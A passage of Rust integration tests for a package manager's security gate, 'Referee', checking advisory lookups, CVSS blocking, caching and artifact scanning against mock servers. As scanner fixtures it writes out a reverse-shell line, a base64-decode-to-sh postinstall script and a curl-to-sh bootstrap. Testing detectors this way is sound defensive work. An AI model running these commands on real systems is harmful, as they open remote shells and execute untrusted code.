//! End-to-end tests for Referee against a mock advisory service.
//!
//! The unit tests elsewhere in this module pin each piece — range matching,
//! CVSS scoring, identity expansion, the scan rules. These tests pin the thing
//! those pieces add up to: a real [`Referee`] talking real HTTP to a server
//! that answers like OSV, writing to a real SQLite cache, and producing the
//! verdicts a command acts on.
//!
//! The server is a few dozen lines of `TcpListener` on purpose. A mock this
//! small has no behaviour of its own to debug, and it records every request, so
//! a test can assert not only what Referee concluded but how many times it
//! asked.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use serde_json::{json, Value};

use crate::core::db::DbManager;
use crate::core::package::{AdvisoryDeclaration, Package, PackageSource};
use crate::error::error::BallError;
use crate::http::HttpClient;
use crate::security::scoring::RefereeThresholds;
use crate::security::verdict::Verdict;
use crate::security::{FailPolicy, Referee};

/// A request the mock server received.
#[derive(Debug, Clone)]
struct Request {
    method: String,
    path: String,
    body: String,
}

/// A throwaway HTTP server for one test.
struct MockServer {
    base_url: String,
    seen: Arc<Mutex<Vec<Request>>>,
    shutdown: Arc<AtomicBool>,
    handle: Option<thread::JoinHandle<()>>,
}

impl MockServer {
    fn start<F>(handler: F) -> Self
    where
        F: Fn(&Request) -> (u16, String) + Send + Sync + 'static,
    {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind a loopback port");
        let port = listener.local_addr().unwrap().port();
        listener
            .set_nonblocking(true)
            .expect("non-blocking listener");

        let seen = Arc::new(Mutex::new(Vec::new()));
        let shutdown = Arc::new(AtomicBool::new(false));

        let thread_seen = Arc::clone(&seen);
        let thread_shutdown = Arc::clone(&shutdown);
        let handler = Arc::new(handler);

        let handle = thread::spawn(move || {
            while !thread_shutdown.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((stream, _)) => {
                        if let Some(request) = read_request(&stream) {
                            thread_seen.lock().unwrap().push(request.clone());
                            let (status, body) = handler(&request);
                            write_response(stream, status, &body);
                        }
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(2));
                    }
                    Err(_) => break,
                }
            }
        });

        Self {
            base_url: format!("http://127.0.0.1:{}", port),
            seen,
            shutdown,
            handle: Some(handle),
        }
    }

    fn requests(&self) -> Vec<Request> {
        self.seen.lock().unwrap().clone()
    }

    fn request_count(&self) -> usize {
        self.seen.lock().unwrap().len()
    }
}

impl Drop for MockServer {
    fn drop(&mut self) {
        self.shutdown.store(true, Ordering::SeqCst);
        if let Some(handle) = self.handle.take() {
            let _ = handle.join();
        }
    }
}

fn read_request(stream: &TcpStream) -> Option<Request> {
    stream.set_read_timeout(Some(Duration::from_secs(5))).ok()?;
    let mut reader = BufReader::new(stream);

    let mut request_line = String::new();
    reader.read_line(&mut request_line).ok()?;
    let mut parts = request_line.split_whitespace();
    let method = parts.next()?.to_string();
    let path = parts.next()?.to_string();

    let mut content_length = 0usize;
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line).ok()? == 0 {
            break;
        }
        let trimmed = line.trim_end();
        if trimmed.is_empty() {
            break;
        }
        if let Some((name, value)) = trimmed.split_once(':') {
            if name.trim().eq_ignore_ascii_case("content-length") {
                content_length = value.trim().parse().unwrap_or(0);
            }
        }
    }

    let mut body = vec![0u8; content_length];
    if content_length > 0 {
        reader.read_exact(&mut body).ok()?;
    }

    Some(Request {
        method,
        path,
        body: String::from_utf8_lossy(&body).into_owned(),
    })
}

fn write_response(mut stream: TcpStream, status: u16, body: &str) {
    let reason = match status {
        200 => "OK",
        404 => "Not Found",
        500 => "Internal Server Error",
        _ => "Unknown",
    };
    let response = format!(
        "HTTP/1.1 {} {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        status,
        reason,
        body.len(),
        body
    );
    let _ = stream.write_all(response.as_bytes());
    let _ = stream.flush();
}

/// A scratch directory nothing else in this test binary can collide with.
fn scratch(label: &str) -> PathBuf {
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, Ordering::SeqCst);
    let dir = std::env::temp_dir().join(format!(
        "baller_referee_it_{}_{}_{}_{}",
        label,
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos(),
        n
    ));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

fn db_in(dir: &std::path::Path) -> DbManager {
    DbManager::init_at_path(&dir.join("db").join("baller.db")).unwrap()
}

fn referee(base_url: &str, policy: FailPolicy) -> Referee {
    Referee::new(
        HttpClient::new().unwrap(),
        true,
        RefereeThresholds::default(),
        policy,
        base_url.to_string(),
        None,
        None,
    )
}

fn crate_pkg(name: &str, version: &str) -> Package {
    Package {
        source: PackageSource::Cargo {
            crate_name: name.to_string(),
        },
        ..Package::new(name, version)
    }
}

/// A `querybatch` answer: `hits[i]` is the advisory ids matching query `i`.
fn batch(hits: &[&[&str]]) -> String {
    json!({
        "results": hits
            .iter()
            .map(|ids| json!({
                "vulns": ids.iter().map(|id| json!({ "id": id, "modified": "2026-01-01T00:00:00Z" })).collect::<Vec<_>>()
            }))
            .collect::<Vec<_>>()
    })
    .to_string()
}

/// A full advisory record affecting everything from 0 up.
fn record(id: &str, ecosystem: &str, name: &str, cvss: &str) -> Value {
    json!({
        "id": id,
        "summary": format!("{} is affected", name),
        "aliases": [format!("CVE-{}", id)],
        "severity": [{ "type": "CVSS_V3", "score": cvss }],
        "affected": [{
            "package": { "ecosystem": ecosystem, "name": name },
            "ranges": [{ "type": "SEMVER", "events": [{ "introduced": "0" }] }]
        }]
    })
}

const CRITICAL: &str = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H";
const MEDIUM: &str = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N";
const LOW: &str = "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N";

#[test]
fn test_a_package_with_no_advisories_passes_silently() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let dir = scratch("clean");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.reports.len(), 1);
    assert_eq!(outcome.reports[0].status(), Verdict::Clean);
    assert!(outcome.blocked().is_empty());
    assert!(outcome.warned().is_empty());
    assert!(outcome.block_error().is_none());

    // Exactly one batch request, and nothing else.
    assert_eq!(server.request_count(), 1);
    assert_eq!(server.requests()[0].method, "POST");
    assert_eq!(server.requests()[0].path, "/v1/querybatch");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_medium_advisory_warns_but_does_not_block() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-medium", "crates.io", "serde", MEDIUM).to_string(),
            );
        }
        (200, batch(&[&["GHSA-medium"]]))
    });
    let dir = scratch("medium");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert!(outcome.reports[0].status().is_vulnerable());
    assert_eq!(outcome.warned().len(), 1);
    assert!(outcome.blocked().is_empty());
    assert!(outcome.block_error().is_none());

    let advisories = outcome.reports[0].advisories();
    assert_eq!(advisories[0].id, "GHSA-medium");
    assert_eq!(advisories[0].aliases, vec!["CVE-GHSA-medium".to_string()]);
    assert!((advisories[0].cvss.unwrap() - 6.1).abs() < 0.05);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_critical_advisory_blocks_the_plan() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-critical", "crates.io", "serde", CRITICAL).to_string(),
            );
        }
        (200, batch(&[&["GHSA-critical"]]))
    });
    let dir = scratch("critical");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.blocked().len(), 1);
    match outcome.block_error() {
        Some(BallError::RefereeBlocked { packages }) => {
            assert_eq!(packages.len(), 1);
            assert_eq!(packages[0].package, "serde");
            assert_eq!(packages[0].version, "1.0.229");
            assert_eq!(packages[0].advisories[0].id, "GHSA-critical");
            assert!(packages[0].reason.contains("block threshold"));
        }
        other => panic!("expected RefereeBlocked, got {:?}", other),
    }
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_low_advisory_passes() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-low", "crates.io", "serde", LOW).to_string(),
            );
        }
        (200, batch(&[&["GHSA-low"]]))
    });
    let dir = scratch("low");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert!(outcome.reports[0].status().is_vulnerable());
    assert!(outcome.warned().is_empty());
    assert!(outcome.blocked().is_empty());
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_one_blocked_dependency_blocks_the_whole_plan() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-dep", "crates.io", "middle", CRITICAL).to_string(),
            );
        }
        // root is clean, the middle dependency is critical, the leaf is clean.
        (200, batch(&[&[], &["GHSA-dep"], &[]]))
    });
    let dir = scratch("depblock");
    let db = db_in(&dir);

    let plan = [
        crate_pkg("root", "1.0.0"),
        crate_pkg("middle", "0.4.0"),
        crate_pkg("leaf", "2.0.0"),
    ];
    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &plan)
        .unwrap();

    assert_eq!(outcome.reports.len(), 3);
    assert_eq!(outcome.blocked().len(), 1);
    assert_eq!(outcome.blocked()[0].name, "middle");
    // The gate is the whole plan's decision: the error exists before anything
    // in the plan has been touched.
    assert!(outcome.block_error().is_some());
    assert_eq!(outcome.reports[0].status(), Verdict::Clean);
    assert_eq!(outcome.reports[2].status(), Verdict::Clean);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_outage_fails_open_and_reports_unverified() {
    let server = MockServer::start(|_| (500, "{\"error\":\"boom\"}".to_string()));
    let dir = scratch("failopen");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Unverified);
    assert_eq!(outcome.unchecked().len(), 1);
    // Fail-open means the install proceeds: nothing is blocked.
    assert!(outcome.block_error().is_none());
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_outage_fails_closed_when_asked_to() {
    let server = MockServer::start(|_| (500, "{\"error\":\"boom\"}".to_string()));
    let dir = scratch("failclosed");
    let db = db_in(&dir);

    let result = referee(&server.base_url, FailPolicy::FailClosed)
        .gate(&db, &[crate_pkg("serde", "1.0.229")]);

    match result {
        Err(BallError::RefereeUnavailable { message }) => {
            assert!(message.contains("fail-closed"));
        }
        other => panic!("expected RefereeUnavailable, got {:?}", other.map(|_| ())),
    }
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_unverified_verdict_is_never_cached() {
    let server = MockServer::start(|_| (500, "{}".to_string()));
    let dir = scratch("nocache");
    let db = db_in(&dir);

    referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    // An outage must not become a durable answer.
    assert_eq!(db.referee_cache_count().unwrap(), 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_verdict_is_cached_and_the_second_run_asks_nothing() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let dir = scratch("cachehit");
    let db = db_in(&dir);
    let referee = referee(&server.base_url, FailPolicy::FailOpen);
    let plan = [crate_pkg("serde", "1.0.229")];

    referee.gate(&db, &plan).unwrap();
    assert_eq!(server.request_count(), 1);
    assert_eq!(db.referee_cache_count().unwrap(), 1);

    let second = referee.gate(&db, &plan).unwrap();
    assert_eq!(second.reports[0].status(), Verdict::Clean);
    assert_eq!(
        server.request_count(),
        1,
        "a cache hit must not hit the network"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_cached_verdict_does_not_cover_another_version() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let dir = scratch("cacheversion");
    let db = db_in(&dir);
    let referee = referee(&server.base_url, FailPolicy::FailOpen);

    referee.gate(&db, &[crate_pkg("serde", "1.0.229")]).unwrap();
    referee.gate(&db, &[crate_pkg("serde", "1.0.230")]).unwrap();

    assert_eq!(server.request_count(), 2);
    assert_eq!(db.referee_cache_count().unwrap(), 2);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_refresh_re_queries_a_cached_identity() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let dir = scratch("refresh");
    let db = db_in(&dir);
    let referee = referee(&server.base_url, FailPolicy::FailOpen);
    let plan = [crate_pkg("serde", "1.0.229")];

    referee.audit(&db, &plan, false).unwrap();
    referee.audit(&db, &plan, true).unwrap();

    assert_eq!(server.request_count(), 2);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_withdrawn_advisory_does_not_count() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            let mut value = record("GHSA-gone", "crates.io", "serde", CRITICAL);
            value["withdrawn"] = json!("2026-02-02T00:00:00Z");
            return (200, value.to_string());
        }
        (200, batch(&[&["GHSA-gone"]]))
    });
    let dir = scratch("withdrawn");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Clean);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_advisory_for_another_version_is_discarded_locally() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                json!({
                    "id": "GHSA-old",
                    "severity": [{ "type": "CVSS_V3", "score": CRITICAL }],
                    "affected": [{
                        "package": { "ecosystem": "crates.io", "name": "serde" },
                        "ranges": [{ "type": "SEMVER", "events": [
                            { "introduced": "0" },
                            { "fixed": "1.0.100" }
                        ]}]
                    }]
                })
                .to_string(),
            );
        }
        (200, batch(&[&["GHSA-old"]]))
    });
    let dir = scratch("oldrange");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Clean);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_package_with_no_ecosystem_is_reported_unknown() {
    let server = MockServer::start(|_| (200, batch(&[])));
    let dir = scratch("unknown");
    let db = db_in(&dir);

    let pkg = Package {
        source: PackageSource::BallerRegistry {
            url: "https://registry.baller.dev/api".to_string(),
        },
        ..Package::new("mystery", "1.0.0")
    };

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Unknown);
    assert_eq!(outcome.unchecked().len(), 1);
    // Nothing queryable means nothing was queried.
    assert_eq!(server.request_count(), 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_registry_native_advisories_need_no_network_call() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let dir = scratch("registrynative");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::BallerRegistry {
            url: "https://registry.baller.dev/api".to_string(),
        },
        ..Package::new("native", "2.0.0")
    };
    pkg.vulnerabilities = vec![json!({
        "id": "BALLER-2026-0001",
        "summary": "the registry knows about this one",
        "severity": [{ "type": "CVSS_V3", "score": CRITICAL }],
        "affected": [{
            "package": { "ecosystem": "BallerRegistry", "name": "native" },
            "ranges": [{ "type": "SEMVER", "events": [{ "introduced": "0" }] }]
        }]
    })];

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.blocked().len(), 1);
    assert_eq!(outcome.reports[0].advisories()[0].id, "BALLER-2026-0001");
    assert_eq!(server.request_count(), 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_declared_alias_is_looked_up_by_id() {
    let server = MockServer::start(|request| {
        if request.path == "/v1/vulns/CVE-2026-9999" {
            return (
                200,
                json!({
                    "id": "CVE-2026-9999",
                    "summary": "declared by the package itself",
                    "severity": [{ "type": "CVSS_V3", "score": CRITICAL }],
                    "affected": []
                })
                .to_string(),
            );
        }
        (200, batch(&[&[]]))
    });
    let dir = scratch("declaredalias");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::BallerRegistry {
            url: "https://registry.baller.dev/api".to_string(),
        },
        ..Package::new("declares", "1.0.0")
    };
    pkg.advisory = Some(AdvisoryDeclaration {
        ecosystem: None,
        name: None,
        aliases: vec!["CVE-2026-9999".to_string()],
    });

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.blocked().len(), 1);
    assert_eq!(outcome.reports[0].advisories()[0].id, "CVE-2026-9999");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_declared_alias_with_ranges_is_matched_on_version_alone() {
    // The record is filed under another ecosystem's spelling of the project.
    // The author declared it, so the entry is read for the versions it names,
    // not the package it names.
    let server = MockServer::start(|request| {
        if request.path == "/v1/vulns/CVE-2026-8888" {
            return (
                200,
                json!({
                    "id": "CVE-2026-8888",
                    "summary": "affects 1.x only",
                    "severity": [{ "type": "CVSS_V3", "score": CRITICAL }],
                    "affected": [{
                        "package": { "ecosystem": "npm", "name": "some-other-spelling" },
                        "ranges": [{ "type": "SEMVER", "events": [
                            { "introduced": "1.0.0" },
                            { "fixed": "2.0.0" }
                        ]}]
                    }]
                })
                .to_string(),
            );
        }
        (200, batch(&[&[]]))
    });
    let dir = scratch("aliasranges");
    let db = db_in(&dir);
    let referee = referee(&server.base_url, FailPolicy::FailOpen);

    let build = |version: &str| {
        let mut pkg = Package {
            source: PackageSource::BallerRegistry {
                url: "https://registry.baller.dev/api".to_string(),
            },
            ..Package::new("declares", version)
        };
        pkg.advisory = Some(AdvisoryDeclaration {
            ecosystem: None,
            name: None,
            aliases: vec!["CVE-2026-8888".to_string()],
        });
        pkg
    };

    let inside = referee.gate(&db, &[build("1.4.0")]).unwrap();
    assert_eq!(inside.blocked().len(), 1);
    assert_eq!(inside.reports[0].advisories()[0].id, "CVE-2026-8888");

    let outside = referee.gate(&db, &[build("2.1.0")]).unwrap();
    assert!(outside.blocked().is_empty());
    assert_eq!(outside.reports[0].status(), Verdict::Clean);

    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_unfetchable_declared_alias_reports_unverified() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (500, "{}".to_string());
        }
        (200, batch(&[&[]]))
    });
    let dir = scratch("aliasdown");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::BallerRegistry {
            url: "https://registry.baller.dev/api".to_string(),
        },
        ..Package::new("declares", "1.0.0")
    };
    pkg.advisory = Some(AdvisoryDeclaration {
        ecosystem: None,
        name: None,
        aliases: vec!["CVE-2026-8888".to_string()],
    });

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Unverified);
    assert!(outcome.block_error().is_none());
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_declared_alias_with_no_record_is_clean() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (404, "{}".to_string());
        }
        (200, batch(&[&[]]))
    });
    let dir = scratch("aliasmissing");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::BallerRegistry {
            url: "https://registry.baller.dev/api".to_string(),
        },
        ..Package::new("declares", "1.0.0")
    };
    pkg.advisory = Some(AdvisoryDeclaration {
        ecosystem: None,
        name: None,
        aliases: vec!["CVE-2026-0000".to_string()],
    });

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Clean);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_declared_ecosystem_is_queried_like_a_primary_one() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-declared", "crates.io", "ripgrep", CRITICAL).to_string(),
            );
        }
        assert!(request.body.contains("\"crates.io\""));
        assert!(request.body.contains("\"ripgrep\""));
        (200, batch(&[&["GHSA-declared"]]))
    });
    let dir = scratch("declaredeco");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::BallerRegistry {
            url: "https://registry.baller.dev/api".to_string(),
        },
        ..Package::new("ripgrep", "14.1.1")
    };
    pkg.advisory = Some(AdvisoryDeclaration {
        ecosystem: Some("crates.io".to_string()),
        name: Some("ripgrep".to_string()),
        aliases: Vec::new(),
    });

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.blocked().len(), 1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_chocolatey_package_is_asked_about_under_both_identities() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-upstream", "GitHub", "ip7z/7zip", CRITICAL).to_string(),
            );
        }
        // NuGet knows nothing; the derived upstream repo does.
        (200, batch(&[&[], &["GHSA-upstream"]]))
    });
    let dir = scratch("choco");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::Chocolatey {
            feed_url: "https://community.chocolatey.org/api/v2".to_string(),
        },
        ..Package::new("7zip", "19.0.0")
    };
    pkg.repository = Some("https://github.com/ip7z/7zip".to_string());

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    let body = &server.requests()[0].body;
    assert!(body.contains("\"NuGet\""), "NuGet identity was not queried");
    assert!(
        body.contains("ip7z/7zip"),
        "derived identity was not queried"
    );
    assert_eq!(outcome.blocked().len(), 1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_the_worst_identity_decides_a_packages_verdict() {
    let server = MockServer::start(|request| {
        if request.path.contains("GHSA-mild") {
            return (
                200,
                record("GHSA-mild", "NuGet", "7zip", MEDIUM).to_string(),
            );
        }
        if request.path.contains("GHSA-severe") {
            return (
                200,
                record("GHSA-severe", "GitHub", "ip7z/7zip", CRITICAL).to_string(),
            );
        }
        (200, batch(&[&["GHSA-mild"], &["GHSA-severe"]]))
    });
    let dir = scratch("worstwins");
    let db = db_in(&dir);

    let mut pkg = Package {
        source: PackageSource::Chocolatey {
            feed_url: "feed".to_string(),
        },
        ..Package::new("7zip", "19.0.0")
    };
    pkg.repository = Some("https://github.com/ip7z/7zip".to_string());

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[pkg])
        .unwrap();

    assert_eq!(outcome.blocked().len(), 1);
    assert_eq!(outcome.reports[0].advisories().len(), 2);
    // Both are reported; the worse one sets the band.
    assert!(outcome.reports[0].risk().unwrap() >= 4.0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_disabled_referee_checks_nothing() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let dir = scratch("disabled");
    let db = db_in(&dir);

    let referee = Referee::new(
        HttpClient::new().unwrap(),
        false,
        RefereeThresholds::default(),
        FailPolicy::FailOpen,
        server.base_url.clone(),
        None,
        None,
    );

    let outcome = referee.gate(&db, &[crate_pkg("serde", "1.0.229")]).unwrap();
    assert!(outcome.skipped);
    assert!(outcome.reports.is_empty());
    assert!(outcome.block_error().is_none());
    assert_eq!(server.request_count(), 0);

    // Phase B is off with it.
    let tree = scratch("disabled_tree");
    std::fs::write(
        tree.join("evil.sh"),
        "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n",
    )
    .unwrap();
    assert!(referee
        .screen_artifact(&crate_pkg("serde", "1.0.229"), &tree)
        .unwrap()
        .is_empty());

    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_custom_thresholds_change_the_outcome() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-medium", "crates.io", "serde", MEDIUM).to_string(),
            );
        }
        (200, batch(&[&["GHSA-medium"]]))
    });
    let dir = scratch("thresholds");
    let db = db_in(&dir);

    // block_at lowered under the advisory's 3.05 risk index.
    let strict = Referee::new(
        HttpClient::new().unwrap(),
        true,
        RefereeThresholds {
            warn_at: 1.0,
            block_at: 3.0,
        },
        FailPolicy::FailOpen,
        server.base_url.clone(),
        None,
        None,
    );

    let outcome = strict.gate(&db, &[crate_pkg("serde", "1.0.229")]).unwrap();
    assert_eq!(outcome.blocked().len(), 1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_phase_b_blocks_a_malicious_archive() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let tree = scratch("phaseb");
    std::fs::write(
        tree.join("postinstall.sh"),
        "#!/bin/sh\necho aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQgZm9yIHRlc3Rpbmc= | base64 -d | sh\n",
    )
    .unwrap();

    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "evil".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    match referee(&server.base_url, FailPolicy::FailOpen).screen_artifact(&pkg, &tree) {
        Err(BallError::RefereeScanBlocked {
            package,
            version,
            findings,
        }) => {
            assert_eq!(package, "tool");
            assert_eq!(version, "1.0.0");
            assert!(findings
                .iter()
                .any(|finding| finding.rule.label() == "suspicious-payload"));
        }
        other => panic!("expected RefereeScanBlocked, got {:?}", other.map(|_| ())),
    }
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_phase_b_passes_a_benign_archive_with_warnings_returned() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let tree = scratch("phaseb_ok");
    std::fs::write(tree.join("README.md"), "# tool\n").unwrap();
    std::fs::write(
        tree.join("bootstrap.sh"),
        "#!/bin/sh\ncurl -fsSL https://example.test/x | sh\n",
    )
    .unwrap();

    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "ok".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    let findings = referee(&server.base_url, FailPolicy::FailOpen)
        .screen_artifact(&pkg, &tree)
        .expect("a warn-level finding must not block");
    assert_eq!(findings.len(), 1);
    let _ = std::fs::remove_dir_all(&tree);
}

/// A Referee with the VirusTotal hook pointed at the mock server.
fn referee_with_vt(base_url: &str) -> Referee {
    Referee::new(
        HttpClient::new().unwrap(),
        true,
        RefereeThresholds::default(),
        FailPolicy::FailOpen,
        base_url.to_string(),
        Some("test-key".to_string()),
        Some(format!("{}/vt", base_url)),
    )
}

#[test]
fn test_virustotal_detection_blocks_and_sends_only_the_hash() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/vt/files/") {
            return (
                200,
                json!({ "data": { "attributes": {
                    "last_analysis_stats": { "malicious": 12, "suspicious": 1, "undetected": 50 },
                    "meaningful_name": "trojan.exe"
                }}})
                .to_string(),
            );
        }
        (200, batch(&[&[]]))
    });
    let tree = scratch("vt_hit");
    let binary = tree.join("tool");
    std::fs::write(&binary, b"\x7fELF harmless looking bytes").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "o".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    match referee_with_vt(&server.base_url).screen_artifact(&pkg, &tree) {
        Err(BallError::RefereeScanBlocked { findings, .. }) => {
            assert!(findings
                .iter()
                .any(|f| f.rule.label() == "virustotal-detection"));
        }
        other => panic!("expected RefereeScanBlocked, got {:?}", other.map(|_| ())),
    }

    // The request must be a GET of a hash, carrying no file content at all.
    let vt: Vec<Request> = server
        .requests()
        .into_iter()
        .filter(|request| request.path.starts_with("/vt/files/"))
        .collect();
    assert_eq!(vt.len(), 1);
    assert_eq!(vt[0].method, "GET");
    assert!(vt[0].body.is_empty());
    let digest = vt[0].path.rsplit('/').next().unwrap();
    assert_eq!(digest.len(), 64, "the path must end in a sha256");
    assert_eq!(
        digest,
        crate::utils::security::sha256_file(&binary).unwrap()
    );

    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_a_clean_virustotal_report_does_not_block() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/vt/files/") {
            return (
                200,
                json!({ "data": { "attributes": {
                    "last_analysis_stats": { "malicious": 0, "suspicious": 0, "undetected": 70 }
                }}})
                .to_string(),
            );
        }
        (200, batch(&[&[]]))
    });
    let tree = scratch("vt_clean");
    let binary = tree.join("tool");
    std::fs::write(&binary, b"harmless").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

